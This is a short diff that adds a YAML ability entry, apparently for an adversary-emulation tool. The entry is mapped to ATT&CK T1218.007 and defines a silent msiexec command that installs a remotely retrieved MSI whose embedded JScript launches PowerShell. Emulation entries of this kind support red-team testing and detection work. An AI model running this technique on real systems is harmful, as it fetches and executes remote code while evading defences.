@@ -1,0 +1,18 @@
+---
+- id: dff11c1e8340bbae0245b866917889af
+  name: Msiexec.exe - Execute Remote MSI file
+  description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
+    in application installation, commonly seen in malware execution. The MSI executes
+    a built-in JScript payload that launches powershell.exe.
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1218.007
+    name: 'Signed Binary Proxy Execution: Msiexec'
+  platforms:
+    windows:
+      cmd:
+        command: '#{msi_exe} /q /i "#{msi_payload}"'
+        payloads: []
+        cleanup: ''
